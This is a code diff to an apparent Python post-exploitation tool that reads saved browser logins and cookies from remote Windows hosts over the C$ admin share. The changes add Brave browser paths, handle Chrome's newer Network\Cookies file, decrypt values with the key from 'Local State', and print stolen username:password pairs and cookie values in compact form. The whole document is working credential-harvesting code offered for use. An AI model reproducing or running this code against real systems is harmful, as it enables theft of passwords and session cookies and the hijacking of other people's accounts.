@@ -31,6 +31,9 @@ class LoginData:
             print('Password:\t%s' % self.password)
         print()
 
+    def dump_quiet(self) -> None:
+        print("[%s] %s - %s:%s" % (self.browser.upper(), self.url, self.username, self.password))
+
 class Cookie:
     def __init__(self, winuser: str, browser:str, host:str, path: str, cookie_name:str, cookie_value:str, creation_utc:str, expires_utc:str, last_access_utc:str):
         self.winuser = winuser
@@ -54,22 +57,40 @@ class Cookie:
         print('Last Access UTC:\t%s' % datetime_to_time(self.last_access_utc))
         print()
 
+    def dump_quiet(self) -> None:
+        print("[%s] %s%s - %s:%s" % (self.browser.upper(), self.host, self.path, self.cookie_name, self.cookie_value))
+
 class BrowserTriage:
 
     false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
     user_google_chrome_generic_login_path = {
         'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State',
         'loginDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
-        'cookiesDataPath':'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
+        'cookiesDataPath':[
+            'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies',
+            'Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies'
+        ]
     }
     user_msedge_generic_login_path = {
         'aesStateKeyPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State',
         'loginDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
-        'cookiesDataPath':'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies'
+        'cookiesDataPath':[
+            'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies',
+            'Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies'
+        ]
+    }
+    user_brave_generic_login_path = {
+        'aesStateKeyPath':'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State',
+        'loginDataPath':'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data',
+        'cookiesDataPath':[
+            'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies',
+            'Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies'
+        ]
     }
     user_generic_chrome_paths = {
         'google chrome':user_google_chrome_generic_login_path,
         'msedge':user_msedge_generic_login_path,
+        'brave':user_brave_generic_login_path,
     }
 
     share = 'C$'
@@ -138,32 +159,32 @@ class BrowserTriage:
                             username=username, 
                             password=password))
                 fh.close()
-
-
-            cookiesData_bytes = self.conn.readFile(shareName=self.share, path=paths['cookiesDataPath'] % user, bypass_shared_violation=True)
-            if aeskey is not None and cookiesData_bytes is not None and len(cookiesData_bytes) > 0:
-                fh = tempfile.NamedTemporaryFile()
-                fh.write(cookiesData_bytes)
-                fh.seek(0)
-                db = sqlite3.connect(fh.name)
-                cursor = db.cursor()
-                query = cursor.execute(
-                    'SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies')
-                lines = query.fetchall()
-                if len(lines) > 0:
-                    for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
-                        cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
-                        cookies.append(Cookie(
-                            winuser=user,
-                            browser=browser,
-                            host=host,
-                            path=path,
-                            name=name,
-                            cookies=cookie,
-                            creation_utc=creation_utc,
-                            expires_utc=expires_utc,
-                            last_access_utc=last_access_utc))
-                fh.close()
+            for cookiepath in paths['cookiesDataPath']:
+                cookiesData_bytes = self.conn.readFile(shareName=self.share, path=cookiepath % user, bypass_shared_violation=True)
+                if aeskey is not None and cookiesData_bytes is not None and len(cookiesData_bytes) > 0:
+                    fh = tempfile.NamedTemporaryFile()
+                    fh.write(cookiesData_bytes)
+                    fh.seek(0)
+                    db = sqlite3.connect(fh.name)
+                    cursor = db.cursor()
+                    query = cursor.execute(
+                        'SELECT creation_utc, host_key, name, path, expires_utc, last_access_utc, encrypted_value FROM cookies')
+                    lines = query.fetchall()
+                    if len(lines) > 0:
+                        for creation_utc, host, name, path, expires_utc, last_access_utc, encrypted_cookie in lines:
+                            cookie = decrypt_chrome_password(encrypted_cookie, aeskey)
+                            cookies.append(Cookie(
+                                winuser=user,
+                                browser=browser,
+                                host=host,
+                                path=path,
+                                cookie_name=name,
+                                cookie_value=cookie,
+                                creation_utc=creation_utc,
+                                expires_utc=expires_utc,
+                                last_access_utc=last_access_utc))
+                    fh.close()
+                    break
         return credentials, cookies
 
     # def readFile_through_wmi(self, shareName, filepath):
